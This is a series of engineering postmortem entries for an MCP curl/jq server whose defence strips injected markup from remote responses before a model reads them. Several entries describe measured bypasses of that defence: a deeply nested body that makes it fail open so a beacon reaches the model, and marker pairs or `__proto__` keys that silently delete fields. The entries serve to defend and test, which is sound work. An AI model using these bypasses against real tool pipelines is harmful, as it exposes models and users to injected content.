### RC-16 — The defence paired tokens across the boundary it could not see

**Date:** 2026-09-02 · **PR:** #33 (branch `fix/defend-undefended-tool-output`) · **Plan:** —

**Class:** K-5 — *class-id:* `unwrapped-multi-write`

- **The plan said:** the wrap defends "every piece of remote-origin text", and
  `defendForInline` was written as one call over one string. Invariant 1a
  reasoned about *which stages* run on a channel and never about *how many
  regions* the string it was handed contains.
- **Reality was:** by the wrap, `formatResponse` has sealed body, headers and
  stderr into one JSON envelope — the same fact RC-15 measured a week earlier
  and read only for its size. The strip stages pair an opening token with a
  closing one and cannot see JSON syntax, so an opener in `response` and a
  closer in `headers` deleted everything between them, **the `headers` key
  included**. Measured: `{"note":"budget <!-- draft"}` as the body with
  `x-trace: a-->b` in the headers returned an envelope with no `headers` key at
  all, and `{"a":"open <!--","b":"close -->","c":"kept"}` — one document, no
  envelope, the `jq_query` shape — came back as `{"a":"open ","c":"kept"}`.
- **What changed:** `defendForInline` now parses a JSON document and defends each
  string LEAF, then re-serialises; the undivided scan is the arm for text that
  is not JSON. Invariant 16 states the property. Object keys are left alone
  deliberately — two keys defending to the same string would collapse into one,
  which is the loss this fix exists to prevent.
- **And the fix's first version broke invariant 14**, which is why this RC has
  two halves. Indenting whenever the input held a newline re-inflated a sparsely
  formatted document by its nesting depth — 53 bytes in, 140 out, against a
  growth ratio that believes the ceiling is 15/9 — so `exceedsInlineCap`'s cheap
  arm would have reported compliance for a body reaching the model over its cap.
  **The obvious repair was worse:** gating that arm on `isDefinitelyJson` made
  the measurement run the full pass, which logs, and the suite failed on a test
  asserting silence — RC-15's own second lesson, arriving from the opposite
  direction one round later. What holds is a comparison against the input, which
  needs no constant at all: indent only where indenting does not grow the
  document.
- **Files:** `src/lib/response/processor.ts` (`defendForInline`,
  `defendInlineString`, `defendJsonLeaves`, `parseJsonDocument`),
  `src/lib/response/post-processor.test.ts`, `ARCHITECTURE.md` invariant 16.

- **What this costs next time:** three rules.

  **The output stayed valid JSON, and that is the whole reason this survived four
  review rounds and a rewrite of the surrounding prose.** A corruption that
  produces a parse error announces itself; this one produced a smaller,
  well-formed document that every consumer accepted. **Where a defence can delete,
  the test is not "does the result parse" but "are all the parts still there".**

  **RC-15 and RC-16 are the same observation read twice.** Both rest on the
  envelope existing at the wrap; RC-15 asked how big it was and shipped, and
  nobody asked what was inside it. **A fact established for one question is worth
  re-interrogating for the next** — the measurement was already in the ledger.

  **Invariant 13 already stated this property one layer down** and did not reach
  here. It says a boundary between remote-controlled regions never comes from the
  bytes themselves; the header/body split obeys it, and then the reassembled
  envelope was handed to a pass that had no notion of regions at all. **A rule
  stated about one seam does not travel to the next one by itself** — K-13, and
  invariant 16 is where the general form now lives.

Reported by chatgpt-codex-connector on PR #33 round 5, graded P1 by them and
confirmed P1 here on the data-loss calibration.

### RC-17 — Three correct fixes in a row, because the layer could not answer the question

**Date:** 2026-09-03 · **PR:** — (todo 002) · **Plan:** `docs/todos/002-header-channel-should-not-be-multiplexed.md`

**Class:** K-12, K-11 — *class-id:* `broken-contract`

- **The plan said:** replace `curl -i` with `--dump-header <tempfile>`, read the
  file back in `executeCurlRequest`, and accept "one temp file per
  `include_headers` request, plus a cleanup path that must hold on the error and
  timeout branches." The todo named that lifecycle as the reason the work had
  been deferred out of review round 3.
- **Reality was:** two things, one about the mechanism and one about the sweep.

  **The mechanism did not need a file.** cURL's `-D` takes a path, and on a
  POSIX host `/dev/fd/3` names an inherited descriptor — so Node can hand the
  child a fourth pipe and read the header block off it directly.

  > **Scope corrected:** RC-18 (2026-09-03). "On a POSIX host" is the assumption
  > this entry shipped with, and it is false — libuv backs the slot with
  > `socketpair(2)`, and Linux cannot reopen a socket through `/proc/self/fd`.
  > The mechanism stands; its platform reach is macOS only. Left as written
  > because the over-broad claim is what RC-18 exists to record.

  Measured before committing to it: stdout carried `HELLO` alone while the descriptor
  carried the block including the chunked trailer, and both header blocks of a
  redirect chain arrived on it with no intermediate body on stdout. That
  retires the cleanup path *entirely* rather than getting it right — the kernel
  reclaims a pipe on exit, timeout and kill alike — and it stops response
  headers (`Set-Cookie`, echoed `Authorization`) transiting the filesystem,
  which the temp file would have newly introduced. **The todo's stated risk was
  the argument against its own prescription**, and reading it as a constraint to
  satisfy rather than a cost to remove is what nearly bought the worse design.

  **The instance list was a third of the real one.** The todo recorded "6
  non-test hits → 3 confirmed instances"; the same sweep returned 17 hits across
  5 non-test files. It missed `response/header-channel.ts` — created in
  `fefc1af`, the todo's *own* source PR — which is the composition layer the
  whole feature runs through.
- **What changed:** `command-executor.ts` gained `HEADER_DUMP_FD` /
  `HEADER_DUMP_PATH`, `ExecuteCommandOptions.captureHeaders`, a conditional
  fourth stdio pipe drained on attach, and `CommandResult.headerBytes`. Its two
  near-copies of the memory guard became one `accountFor` before the header
  stream made a third. `buildCurlArgs` pushes `--dump-header` and no longer
  emits `%{size_header}`. `parser.ts` lost `splitResponseHeaders`,
  `SplitResponse` and `headerBytes` (244 → 143 lines). `header-channel.ts` takes
  header octets and no longer splits anything. The `save_to_file`/`jq_filter`
  refusal in `curl-execute.ts` is gone, because the body it protected is now
  body bytes on every path. `ARCHITECTURE.md` invariant 13 leads with the strong
  form; `docs/architecture/architecture.md` and the tool description follow.
- **What this costs next time:** three rules.
  1. **A cost a plan states honestly is still a cost, and the plan is not the
     place that decides whether it must be paid.** This one named its own
     lifecycle risk, in writing, and had been deferred once because of it — and
     the mechanism that removed the risk outright was one probe away. **Read a
     stated cost as a question, not a settled term.**
  2. **An instance list ages faster than the finding it belongs to.** This one
     was already incomplete on the day it was filed, because the sweep ran mid-PR
     and the composition layer landed in the same commit that closed it. **Re-run
     the sweep before trusting the count** — it is the cheapest step in the audit
     and it was the one that moved the scope by 2×.
  3. **When a layer has produced three correct-and-wrong fixes, the finding is
     the layer.** Each of RC-1, RC-2 and this one was right about its
     predecessor. What ended it was not a better fix at that layer but moving the
     precondition so the layer had nothing to answer — `skill: pr-resolver-safety`
     → the escalation ladder, rung 3.

### RC-18 — The measurement was real; its scope was assumed

**Date:** 2026-09-03 · **PR:** — (todo 002, review round 1) · **Plan:** `docs/todos/002-header-channel-should-not-be-multiplexed.md`

**Class:** K-9, K-3 — *class-id:* `stale-observation`

- **The plan said:** RC-17, filed hours earlier in this same run, recorded
  `--dump-header /dev/fd/3` as verified — *"Measured before committing to it"* —
  and `ARCHITECTURE.md` stated the mechanism depends on `/dev/fd/N` naming an
  inherited descriptor, *"true on macOS and Linux, false on Windows."*
- **Reality was:** the measurement was taken on macOS only, and the Linux half
  was reasoning presented as observation. It is also **false**. libuv backs an
  extra `"pipe"` stdio slot with `socketpair(2)`, so the child's fd 3 is an
  `AF_UNIX` socket — confirmed here, `[ -S /dev/fd/3 ]` reports `TYPE=SOCKET`
  and `ls -lL` shows `srw-rw-rw-`. macOS serves `/dev/fd/N` from `fdescfs` and
  dups the descriptor, so cURL opens it. Linux resolves `/dev/fd` to
  `/proc/self/fd`, where a socket appears as `socket:[inode]` and cannot be
  opened at all — cURL would have exited 23 on **every** `include_headers`
  request, returning an empty body. There is no `.github/workflows/` in this
  repository, so nothing would have caught it.
- **Compounding, and worse than either half:** the same change had rewritten the
  degraded-path notice to read *"the body below is unaffected"*, keyed only on
  whether headers arrived. On Linux that would have labelled every empty
  failed body as intact — the exact corruption the `save_to_file`/`jq_filter`
  refusal had existed to prevent, reintroduced by the change that deleted the
  refusal as no longer necessary.
- **What changed:** the operator ruled the deployment macOS-only, so the
  mechanism stands. `platformSupportsHeaderDump()` guards the flag so an
  unsupported host keeps its body instead of failing outright; the notice is
  gated on `exitCode === 0` and a non-zero exit is now surfaced on the plain
  branch at all; `ARCHITECTURE.md` → *Environments* and the published
  `docs/architecture/architecture.md` state macOS and say why.
- **What this costs next time:** three rules.
  1. **A measurement carries the platform it was taken on, and nothing else.**
     Writing "measured" beside a claim wider than the measurement is worse than
     writing nothing: it is the sentence that stops the next reader checking.
     **Say where you measured, in the same breath as what you measured.**
  2. **When a mechanism depends on an object another layer creates, the
     question is its TYPE, not its name.** `/dev/fd/3` resolved fine; what did
     not was that libuv had made it a socket rather than a pipe. The premise
     sat on the far side of an interface this code does not own — which is
     exactly where a premise is cheapest to state and most expensive to assume.
  3. **Deleting a guard on the grounds that its precondition is gone requires
     proving the precondition is gone on every platform the guard covered.**
     The refusal was removed because "the body is always body bytes now". That
     was true on the platform it was tested on, and the untested platform is
     precisely where the guard would still have been earning its place.

**Found by review, before merge.** Two independent reviewers — `security-sentinel`
and `data-integrity-guardian` — reached it through different lenses and graded it
P1. That convergence is the signal; either alone would have been easier to argue
down. `ARCHITECTURE.md` invariant 13 and RC-17 remain otherwise correct, and
RC-17's mechanism is **not** superseded — only its verification claim was wrong.

---

### RC-19 — Bounding a map and sizing the bound are two decisions, and only the first got reviewed

**Date:** 2026-09-03 · **PR:** #35 (review rounds 1–3) · **Plan:** —

**Class:** K-11, K-13 — *class-id:* `misplaced-decision`, `fail-open-default`

- **The plan said:** round 1 bounded the two log-throttle maps at the write and
  **declined** to bound `rate-limiter.ts`, recording the reason in
  `bounded-throttle.ts`: *"Evicting a counter resets it, which turns a
  bounded-memory fix into a bypass of the thing the counter enforces."*
- **Reality was:** that reasoning rules out one *policy*, not every policy —
  `SessionManager.set` had been rejecting-when-full four directories away the
  whole time. Round 2 reopened the decline on exactly the route RC-10 sanctions
  (*a decision recorded with its reasoning can be reopened by showing the
  reasoning does not reach a site*), and four reviewers reached it independently.
  **Then round 2 chose the right policy and reached for the wrong number**: it
  bounded the counters with `THROTTLE.MAX_TRACKED_KEYS`, a constant sized for
  ≤128-char log labels where overflow costs one line of stderr, on maps where
  overflow *refuses a request*. Measured in round 3: four sessions issuing 1023
  requests to distinct hosts fill the map, and a fifth session that has spent
  **1 of its 300** permitted requests is refused every unseen hostname.
- **Compounding, and found only because someone probed the clock:** the window is
  a wall-clock difference, so a backwards step (NTP, VM resume, snapshot restore)
  leaves every entry stamped in the future, nothing ever expires, and — because
  expiry is the only route to freeing capacity — the *new rejecting cap* turned a
  merely-large map into a total refusal lasting the whole step. The bound created
  the outage; the leak it replaced had none.
- **And the tests could not see any of it.** Round 2's fixture rotated the client
  id per call, so the client gate saturated first and the host map peaked at
  **966 of 1024** — the host cap's refusal branch was never executed. The case
  whose own comment read *"this is the assertion that fails if someone reaches
  for the evicting helper"* passed under both policies.
- **What changed:** `RATE_LIMIT.MAX_TRACKED_KEYS` is its own value, *derived*
  (`SESSION.MAX_SESSIONS × MAX_PER_CLIENT_PER_MINUTE`) so it cannot go stale if
  either input moves; `windowClosed` treats a negative age as closed and both the
  sweep and the window check use it; the fixture rotates clients in blocks and
  every capacity case asserts the map is at exactly the cap before testing
  behaviour at it. All three teeth-probed.
- **Settled, so it stays settled:** `data-integrity-guardian` filed a P2 asking to
  replace eviction with dropping the log line. **Declined with evidence** —
  `security-sentinel` and `performance-oracle` showed the premise is inverted
  (evicting a throttle *memo* makes a host log **sooner**, so suppression is
  impossible and amplification is below 1), and the proposed fix would have
  introduced the suppression it feared. Its author confirmed the decline in round
  3. A later round proposing it again is answered by citing this line.
- **What this costs next time:** three rules.
  1. **A shared constant carries its subsystem's cost model, not just its
     value.** Reaching for a neighbouring limit because the number looks right
     imports the assumption behind it. Ask what *exceeding* it does here — a
     dropped log line and a refused request are not the same failure.
  2. **Choosing the policy and sizing it are separate reviews.** Round 2's policy
     was right and unanimous, which is exactly why nobody looked at the number.
     A finding that four reviewers agree on is the one whose *details* go
     unexamined.
  3. **A guard added to a map with two gates needs a fixture that reaches the gate
     under test.** Two limits in one call path saturate in some order, and the
     first one to fire hides the second. Assert the precondition — *the map is at
     the cap* — before asserting behaviour at it, or the case certifies nothing.

---

### RC-20 — Routing a path into a shared defence inherits the defence's defects, and "the guard now runs" is not "the payload survives"

**Date:** 2026-09-04 · **PR:** — (branch `fix/shipped-binary-registers-tools-unwrapped`) · **Plan:** `docs/todos/006-P1-shipped-binary-registers-tools-unwrapped.md`

**Class:** K-11, K-2 — *class-id:* `broken-contract`, `unwrapped-multi-write`

- **The plan said:** todo 006 scoped the fix as one seam — give `registerAllTools`
  the body `extensible/tool-wrapper.ts` already has, so invariant 1's wrap applies
  on the shipped binary as it does on the library. It adjudicated the layer
  question (not inside the executors, which would be a MAJOR bump under invariant
  11) and called the result *"not a public-contract change"*. Both claims were
  correct, and the registration fix was correct.
- **Reality was:** the wrap had **never run on that path**, so routing traffic
  into it exposed two P1 defects in the wrap's own JSON handling that were
  previously reachable only through `McpCurlServer`. (1) `defendJsonLeaves`
  recursed on remote-chosen nesting depth: a **4,035-byte** body of `"[" × 2000`
  around a beacon overflowed the stack, `createWrapper`'s catch logged the
  `RangeError`, **tagged the untouched result as wrapped** so a downstream wrap
  short-circuited too, and the beacon reached the model verbatim — a remote could
  switch the whole defence off with 4 KB. (2) A string leaf that was itself a
  serialised document was scanned undivided, so
  `{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}` returned as
  `{"a":"open ","d":"kept"}` — RC-16 one nesting level down, with the file on disk
  still holding all four fields.
- **What changed:** `response/processor.ts` gained `MAX_INLINE_DEFENCE_DEPTH`
  (100, matching `extensible/schema-sanitizer.ts::MAX_RECURSION_DEPTH`) checked by
  an iterative `exceedsDefenceDepth`, and `defendJsonLeaves`' string arm now
  recurses on **composite** leaves only — `JSON_DOCUMENT_FIRST_CHARS` admits
  digits and `-`, so recursing into a scalar would rewrite `"1.50"` as `"1.5"`.
  The depth gate is deliberately **not** in `parseJsonDocument`: `isDefinitelyJson`
  shares it, and a rejection there would strip the *persisted* copy and break
  RC-8/RC-10's split. The `include_headers`-without-metadata arm of the same class
  is `docs/todos/012`.
- **What this costs next time:** **a fix that routes a path into a shared layer
  adopts every defect that layer has, and the review question is not "does the
  guard run now?" but "what does the guard do to this traffic?"** `skill:
  pr-resolver-safety` already says *"then ask what the fix newly made true"*; this
  is what that costs when skipped. The verification that missed it was an
  end-to-end smoke test against the **default** flags — it passed, because both
  defects need `include_metadata`, `include_headers`, or adversarial depth. **A
  smoke test on defaults certifies the default path and nothing else.**

---

### RC-21 — A regression guard for a two-path invariant asserted it on one path, so the other could revert with the suite green

**Date:** 2026-09-04 · **PR:** — (branch `fix/shipped-binary-registers-tools-unwrapped`) · **Plan:** `docs/todos/006-P1-shipped-binary-registers-tools-unwrapped.md`

**Class:** K-1, K-4 — *class-id:* `broken-contract`, `missing-validation`

- **The plan said:** todo 006's acceptance criterion was *"a server built via
  `createServer()` + `registerAllCapabilities()` returns `[image removed]` for an
  `application/json` body containing a markdown beacon"* — singular, and the new
  `tools/register-all-tools.test.ts` satisfied it.
- **Reality was:** `registerAllTools` registers **two** tools, and the guard
  asserted the wrap for `curl_execute` while asserting only *name presence* for
  `jq_query`. Reverting the `registerJqToolWithHooks` call to a bare
  `server.registerTool` — the exact shape the commit had just deleted — passed the
  entire suite. The guard written to close todo 006 recreated todo 006's
  precondition on the sibling tool. Two reviewers found it independently from
  different lanes, and `learnings-researcher` joined it to **RC-1** (an invariant
  satisfied by the bug it was written to prevent) and **RC-6**.
- **What changed:** a `jq_query` wrap assertion in the same file, driving the
  captured handler against a temp JSON file holding a beacon. Teeth verified by
  probe: a bare `jq_query` registration fails it.
- **What this costs next time:** **the assertion set must match the registration
  set.** Where a change routes N paths through one guard, N-1 assertions is a
  false green — and the missing one is invisible because the tool is still
  *registered*, just not *guarded*. The cheap test is the one this file's own
  header states: name the smallest edit to the subject that keeps the suite
  passing, make it, and run.

### RC-22 — "The defect survives my fix" and "my fix caused the defect" are different claims, and only the first was measured

**Date:** 2026-09-04 · **PR:** #36 (branch `fix/shipped-binary-registers-tools-unwrapped`) · **Plan:** `docs/todos/012-P1-headers-prefixed-body-is-defended-undivided.md`

**Class:** K-11, K-9 — *class-id:* `broken-contract`, `stale-observation`

- **The plan said:** the `include_headers`-without-metadata arm of the splice
  class is **pre-existing**, verified still failing *after* `e6ad205`, and
  therefore out of the authorised scope — filed as `docs/todos/012` rather than
  carried.
- **Reality was:** that verification only ever asked one side of the boundary.
  *Post*-fix the arm fails, which was measured and true; *pre*-fix on the
  **shipped binary** it did not exist at all, because the pre-wrap registration
  never ran `defendForInline` over the composed string. Measured on the
  registration path with `include_headers: true`:
  `{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}` returns
  `["a","b","c","d"]` under the raw registration and `["a","d"]` under the
  wrapped one. So the branch **introduced** silent field deletion on the one
  entry point it exists to fix, and filed it as somebody else's pre-existing
  problem. Codex reported it as a regression; the handoff had already recorded
  it as pre-existing, and the record was the more confident of the two.
- **A second failure inside the same episode, and the worse one.** The first
  probe written to test codex's claim mocked `../types/index.js` by **absolute
  path** while `curl-execute.ts` imports it by relative specifier, so the mock
  never applied, the real random separator ran, `metadataFound` was false, and
  the body arrived non-JSON on *both* arms — producing `["a","d"]` either side
  and reading as *"the regression claim is wrong"*. That conclusion was stated
  out loud before the probe was checked. A probe that silently fails to mock
  what it names is a **false green in measurement form**, and it argues for
  dismissing a real P1.
- **What changed:** `curl-execute.ts` defends the body as its own region before
  `formatResponse` composes it (invariant 13's shape — the split point is known
  only to the composer). Idempotence measured at zero growth on the second
  pass, so the wrap's later undivided pass over the composed text is a no-op and
  invariant 14's accounting is unchanged. Six cases at the registration
  boundary; teeth verified — reverting the fix fails three.
- **What this costs next time:** **when declining a finding as pre-existing,
  name the boundary and measure BOTH sides of it** — the defect's presence after
  the fix says nothing about its presence before, and on a change whose whole
  purpose is to route a path somewhere new, "pre-existing in the destination" and
  "new to the traveller" are the same bytes. And **a probe is a subject under
  test too**: before trusting a null result, assert the mock actually bound —
  here, that the separator was consumed.

### RC-23 — A defence that rebuilds an object from remote-chosen keys loses every key that names a prototype accessor

**Date:** 2026-09-04 · **PR:** #36 (branch `fix/shipped-binary-registers-tools-unwrapped`) · **Plan:** — (found in review)

**Class:** K-5, K-11 — *class-id:* `broken-contract`

- **The plan said:** `defendJsonLeaves` defends a document value by value so the
  strip cannot pair markers across fields, and *"the defence never deletes a
  field"* — asserted by a suite of comment, script and scalar cases.
- **Reality was:** the accumulator was a `{}` literal, so `defended["__proto__"] = …`
  reaches `Object.prototype`'s **inherited setter** instead of creating an own
  property. `JSON.parse` gives `__proto__` an own property, so the field arrives
  and then vanishes: `{"__proto__":{"value":"kept"},"ok":2}` re-serialised as
  `{"ok":2}` — two fields in, one out, silently, leaving valid JSON. The same
  class RC-16 named, arriving through a prototype accessor rather than a paired
  marker, and past every case in the guard because no case used a key that is
  also an accessor. Pre-existing at the top level; `e6ad205`'s nested arm
  extended its reach one level deeper.
- **What changed:** `Object.create(null)` as the accumulator, which has no such
  accessor to reach. Two cases — top-level and nested-leaf — and the fixtures are
  **literal JSON strings**, not object literals: a `__proto__:` key in JS source
  sets the prototype, so a `JSON.stringify`-built fixture arrives with the field
  already missing and passes against the unfixed code. Teeth verified.
- **What this costs next time:** **where a remote picks the keys, the key space
  includes the names your language reserves** — enumerate cases from the *key
  space* rather than from the value space, and use `Object.create(null)` for any
  accumulator keyed by untrusted strings. Sweep run:
  `rg -n 'Object\.entries\(|\[key\] *='` over `src/lib` — 12 candidates, one
  confirmed, the rest either in-place mutations (safe: an own property is written
  directly) or `Map` iterations.

### RC-24 — A parse-and-reserialise defence rewrites every number it passes, and the obvious fix for that would have failed the defence open

**Date:** 2026-09-04 · **PR:** #36 (branch `fix/shipped-binary-registers-tools-unwrapped`) · **Plan:** — (found in review round 2)

**Class:** K-5, K-2 — *class-id:* `broken-contract`, `fail-open-default`

- **The plan said:** the region-wise walk's numeric residual is cosmetic and
  bounded — `defendJsonLeaves`' docblock had recorded *"re-serialising
  normalises their spelling (`1.50` becomes `1.5`)"* and judged that nothing
  reads meaning from the spelling of an inline copy.
- **Reality was:** the residual is not cosmetic and it is not confined to
  spelling. `JSON.parse` routes every number through a double, so
  `9223372036854775807` — an ordinary 64-bit identifier — returns
  `9223372036854776000`, and `1e400` overflows to `Infinity` and stringifies as
  **`null`**. The example in the docblock was the harmless member of the class,
  and it was chosen as the whole class. An MCP whose purpose is proxying
  arbitrary APIs meets snowflake ids and database bigints as a matter of course,
  and it hands the model a plausible **wrong value** with no signal — worse than
  the field deletion the walk exists to prevent, because a missing field leaves a
  gap somebody can notice.
- **The near-miss, caught before commit and the more instructive half.** The
  clean fix is `JSON.rawJSON` with the reviver's `context.source`, which
  round-trips every lexeme exactly — measured across seven shapes. It landed in
  **Node 21**. `docs/getting-started.md` stated a floor of **Node 18** — as did
  `docs/architecture/architecture.md` — and `package.json` declared **no
  `engines` field at all**, so an older host was reachable; there
  `JSON.rawJSON` is `undefined`, the call throws inside `defendForInline`,
  `createWrapper` catches it and tags the **undefended** result as wrapped. That
  is RC-20's P1 exactly — a fail-open on every JSON response, introduced by a
  fidelity fix. Written and typechecked before the floor was checked.
- **What changed:** `keepNumberLexeme` behind a load-time capability probe
  (`rawJson`/`isRawJson`), so the lexeme-preserving parse runs only where the
  host has it and the fallback is today's behaviour rather than a throw. Opt-in
  via `parseJsonDocument(text, true)`, so `isDefinitelyJson` keeps its cheap
  parse and the persisted artefact keeps what RC-8 and RC-10 pinned. Guarded at
  three walk sites, since a marker is `typeof "object"` and would otherwise be
  walked as a composite.
- **What this costs next time:** **when a docblock names a residual, check
  whether the example is the worst member of its class or the most comfortable
  one** — "normalises spelling" and "returns a different number" are the same
  mechanism at two magnitudes, and only one of them is worth writing down. And
  **before reaching for a language feature inside a defence, check the project's
  declared floor**: a defence that throws does not fail loudly here, it fails
  open. **And check every declared floor, not the first one found:** two docs
  stated Node 18 here — `docs/getting-started.md:7` and
  `docs/architecture/architecture.md:16` — and this entry originally cited
  `README.md`, which declares no floor at all. The mis-citation survived a
  review round and a PR reply before the sweep that found the second doc also
  found the error (K-7).

**RESOLVED 2026-09-04 (round 4).** The operator raised the floor: `engines: {
node: ">=22" }` in `package.json`, both docs updated, the capability probe
deleted and lexeme preservation made unconditional. Because `engines` is
advisory — npm warns and installs anyway without `engine-strict` — the probe was
replaced by an **import-time throw** naming the runtime, so a too-old host fails
loudly at load instead of failing open per request. Teeth verified: stubbing the
pair absent produces *"mcp-curl requires Node >= 22"*.

### RC-25 — A guard can have teeth and still not test the thing its name claims

**Date:** 2026-09-04 · **PR:** #36 (branch `fix/shipped-binary-registers-tools-unwrapped`) · **Plan:** — (found in review round 2)

**Class:** K-1, K-9 — *class-id:* `broken-contract`

- **The plan said:** round 1's `include_headers` cases guard the composition
  fix, and the teeth probe confirmed it — reverting the fix failed three of them.
- **Reality was:** the probe ran on darwin, and `platformSupportsHeaderDump()` is
  `process.platform === "darwin"`. On a Linux runner those cases take the
  `headers_unsupported` branch and **no header block is composed at all**.
  Codex reported this as a false green; measured, that conclusion is **wrong** —
  the cases still fail there, because `formatResponse` prepends the "cannot be
  captured on this host" notice and that prefix breaks the JSON parse exactly as
  a header block does. So the guard keeps its teeth and loses its **subject**: a
  case named for the header block silently exercises the notice prefix instead,
  and nothing on either platform says so. The mechanism was right and the
  consequence was not, which is the ordinary shape of a bot finding.
- **What changed:** `platformSupportsHeaderDump` stubbed `true` alongside
  `executeCommand`, and `bodyAfterHeaders` now asserts the prefix is present
  before extracting — so the case cannot go vacuous if the capability, the
  platform, or the composition changes underneath it. Teeth verified: forcing
  the stub `false` now fails with *"expected a header prefix"* rather than
  passing.
- **What this costs next time:** **a teeth probe answers "can this fail", never
  "does this test what it says".** Where a test's subject depends on an ambient
  capability, stub the capability and **assert the precondition** — otherwise the
  probe is measuring one machine and the name is describing another. Related:
  the same round found a guard with no teeth at all (`isCompositeValue`'s
  raw-number arm, which removing changed nothing until a whitespace-padded
  numeric string — `" 123"` → `"123"` — was added to the control). Both
  directions are worth probing: a guard that cannot fail, and a guard that fails
  for the wrong reason.

### RC-26 — The fix closed the arm the reviewer demonstrated, and the code had already documented the other one

**Date:** 2026-09-04 · **PR:** #36 (branch `fix/shipped-binary-registers-tools-unwrapped`) · **Plan:** — (found in review round 3)

**Class:** K-4, K-11 — *class-id:* `broken-contract`

- **The plan said:** round 1 closed the composed-string splice by defending the
  body as its own region before `formatResponse` prefixes anything to it. Six
  cases, teeth verified, `docs/todos/012` closed.
- **Reality was:** it closed the arm the reviewer had demonstrated — markers in
  **values** — and not the class. `defendJsonLeaves` deliberately does not
  defend object **keys**, and says so in its own docblock: *"Two keys that
  defended to the same string would collapse into one, losing a field… A beacon
  in a key therefore survives to the model; it is a stated residual."* So the
  prepass cannot make the body marker-free, and the wrap's undivided pass over
  the composed text pairs a marker in one key with one in a later key. Measured:
  `{"<!--":"a","b":"secret","-->":"c","d":"kept"}` returns `{"":"c","d":"kept"}`
  under `include_headers: true` — two fields deleted, valid JSON left behind.
- **The evidence was already in context.** That docblock was read while writing
  the round-1 fix. What was not done is the join: *keys are deliberately
  undefended*, therefore *a prepass over values cannot make the composed string
  safe*. The reviewer's example was values, the sweep was derived from the
  example, and the class definition was sitting three lines above the code being
  edited.
- **What this says about the layer, which is the actual finding.** Two rounds of
  fixes at the composition have each closed one arm, and the escalation ladder's
  third rung is the one that applies: *no fix exists at that layer.* The wrap
  receives one string and cannot recover where the header block stopped — a
  composed prefix and remote body are syntactically indistinguishable — so every
  fix here is a patch on whichever marker shape the last reviewer chose. The
  precondition has to move to the caller: give the wrap the regions instead of a
  composed string. That is a public-contract change and so escalated rather than
  taken.
- **What this costs next time:** **when a fix relies on a sibling function
  making something safe, read that function's stated residuals before claiming
  the class is closed** — and when the second arm of one class arrives, price
  the layer rather than the arm. `.claude/rules/42-ship-what-matters.md`'s
  convergence rule had already fired on this surface a round earlier, and the
  right response to it is not a third patch.

### RC-27 — the number-lexeme fix had one implementation and three call sites

**Date:** 2026-09-06 · **PR:** — · **Plan:** `docs/todos/008-P2-over-cap-preview-is-computed-then-discarded.md`

**Class:** K-12, K-11, K-4

- **The plan said:** nothing about numbers at all. Todo 008 was a performance and
  altitude finding about the over-cap preview, and RC-24 was already recorded as
  closed — `defendForInline` preserves every number's source lexeme through
  `keepNumberLexeme`, measured byte-exact on `9223372036854775807` and `1e400`.
- **Reality was:** RC-24 fixed the site it was reported against. Two siblings did
  the same parse-and-reserialise without the reviver — `jq/filter.ts::applyJqFilter`
  and `response/processor.ts::processResponse`'s Step 6 `jq_filter` branch — so the
  SAME body returned its numbers exactly when inline and corrupted through jq.
  Measured against the shipped binary over stdio: `9223372036854775807` came back
  `9223372036854776000` (out by 193), `1e400` came back `null`, `3.140` came back
  `3.14`. Found by driving `jq_query` on a saved file to check that this todo's new
  save message — which now tells the model to use that tool — was truthful.
- **What changed:** `keepNumberLexeme`, `rawJson` and `isRawNumber` moved to
  `utils/json-lexeme.ts` and are imported by all three sites, so the rule has one
  implementation. `jq/filter.ts::isRecord` gained an `isRawNumber` arm: a marker is
  an object at runtime, so without it `.pi.rawJSON` returned the string `"3.140"`
  and leaked the internal representation as though the origin had sent it.
  Regression tests at the tool boundary in `tools/register-all-tools.test.ts` cover
  the two jq surfaces separately — verified by probe that restoring one reviver
  alone still fails the other's cases.
- **What this costs next time:** when an RC's fix is a *rule about a primitive*
  rather than a repair to one function, the sweep query is the primitive, not the
  symptom. `rg 'JSON\.parse\(' src` returns three lines and would have found all of
  this on the day RC-24 landed. A fix that leaves its rule with one implementation
  and two bypasses has closed the instance and not the class.

### RC-28 — the invariant-14 guard measured a value its own consumer discards

**Date:** 2026-09-06 · **PR:** — · **Plan:** `docs/todos/008-P2-over-cap-preview-is-computed-then-discarded.md`

**Class:** K-1, K-3

- **The plan said:** delete the over-cap preview, because `formatResponse`'s saved
  branch never reads it. Todo 008 named no test as depending on it.
- **Reality was:** `response/processor.test.ts`'s *"the bytes the MODEL receives are
  inside the cap, end to end"* asserted invariant 14 by defending `result.content`
  on the saved path — which passed only because the preview truncated it. Applying
  the plan literally would have deleted a live invariant-14 guard. The guard was
  itself wrong: `result.content` is not what the model receives there, so a test
  named "end to end" stopped one call short of the end and would have gone on
  passing had the preview been corrupted.
- **What changed:** the assertion moved to `formatResponse`'s own output, on both
  the metadata and plain branches, plus a sibling asserting no body bytes appear
  at all. `ProcessedResponse`'s saved arm no longer carries `content`, so the raw
  body is unreachable there by construction rather than by comment. Both new cases
  were themselves false greens on first writing — they passed `""` as `stdout`, a
  value the test controlled — and were only caught by probing them.
- **What this costs next time:** a test that reads a field is also claiming that
  field is what the consumer reads, and that half is never asserted. When a fix
  removes a value, check what asserts on it *before* deciding the removal is safe —
  and probe the replacement, because a guard written to replace a false green is
  written under the same pressure that produced the first one.
